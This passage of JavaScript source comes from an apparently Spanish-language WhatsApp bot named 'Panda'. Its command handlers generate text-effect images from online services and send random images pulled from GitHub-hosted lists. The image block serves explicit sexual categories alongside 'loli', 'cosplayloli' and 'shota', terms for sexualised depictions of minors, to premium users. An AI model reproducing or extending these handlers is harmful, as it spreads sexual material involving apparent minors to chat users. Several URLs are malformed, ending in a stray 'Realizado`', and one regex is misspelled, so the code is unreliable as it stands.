if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
Panda.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Ejemplo : ${prefix+command} Panda`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
Panda.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Ejemplo : ${prefix+command} Panda`) 
reply(mess.wait)
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
Panda.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'aesthetic': case 'ahegao': case 'akira': case 'akiyama': case 'ana': case 'anjing': case 'art': case 'ass': case 'asuna': case 'ayuzawa': case 'bdsm': case 'boneka': case 'boruto': case 'bts': case 'cecan': case 'chiho': case 'chitoge': case 'cogan': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cuckold': case 'cum': case 'cyber': case 'darkjokes': case 'deidara': case 'doraemon': case 'eba': case 'elaina': case 'emilia': case 'ero': case 'erza': case 'exo': case 'femdom': case 'foot': case 'freefire': case 'gamewallpaper': case 'gangbang': case 'gifs': case 'glasses': case 'gremory': case 'hekel': case 'hentai': case 'hestia': case 'hijaber': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jahy': case 'jeni': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'kartun': case 'katakata': case 'keneki': case 'kotori': case 'kpop': case 'kucing': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'masturbation': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'milf': case 'minato': case 'mobil': case 'motor': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'orgy': case 'panties': case 'pentol': case 'pokemon': case 'profil': case 'programming': case 'pubg': case 'pussy': case 'randblackpink': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'ryujin': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'tatasurya': case 'technology': case 'tejina': case 'tentacles': case 'thighs': case 'toukachan': case 'tsunade': case 'waifu': case 'wallhp': case 'wallml': case 'wallnime': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
let heyy
if (/aesthetic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/aesthetic.json')
if (/random/.test(command)) heyy = await fetchJson('Assets/random/random.json')
if (/ahegao/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ahegao.json')
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ana.json')
if (/anjing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/anjing.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/art.json')
if (/ass/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ass.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ayuzawa.json')
if (/bdsm/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/bdsm.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/chihoRealizado`')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/chitogeRealizado`')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/coganRealizado`')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplaysagiri.json')
if (/cuckold/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cuckold.json')
if (/cum/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cum.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cyber.json')
if (/darkjokes/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/darkjokes.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/emilia.json')
if (/ero/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ero.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/femdom.json')
if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/foot.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gamewallpaper.json')
if (/gangbang/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gangbang.json')
if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gifs.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gremory.json')
if (/hekel/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hekel.json')
if (/hentai/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hentai.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hestia.json')
if (/hijaber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hijaber.json')
if (/hinata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hinata.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/itori.json')
if (/jahy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jahy.json')
if (/jeni/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaori.json')
if (/kartun/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kartun.json')
if (/katakata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/madara.json')
if (/masturbation/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/masturbation.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/miku.json')
if (/milf/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/milf.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/minato.json')
if (/mobil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/onepiece.json')
if (/orgy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/orgy.json')
if (/panties/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/panties.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pubg.json')
if (/pussy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pussy.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shota.json')
if (/tatasurya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tejina.json')
if (/tentacles/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tentacles.json')
if (/thighs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/thighs.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessaage = {
image: { url: yeha }, 
jpegThumbnail: ppnyauser,
caption: `Que opinas @${sender.split("@")[0]}`,
fileLength: "999999999999",
mentions: [sender],
footer: `Desarollador Panda`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hola ${pushname}`, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": { url: yeha },
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}}
}
Panda.sendMessage(m.chat, buttonMessaage, { quoted: m })
}
break
case 'fox':  
case 'dog':  
case 'cat':
case 'Panda':  
case 'birb': 
case 'koala': 
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
neys = await fetchJson(`https://some-random-api.ml/img/${command}`)
anu1 = await getBuffer(neys.link)
Panda.sendMessage(m.chat, { image: anu1, caption: `${mess.succes}` }, { quoted : m })
break
case 'jjmeryani':{
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
let kaydt = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/meryani.json')
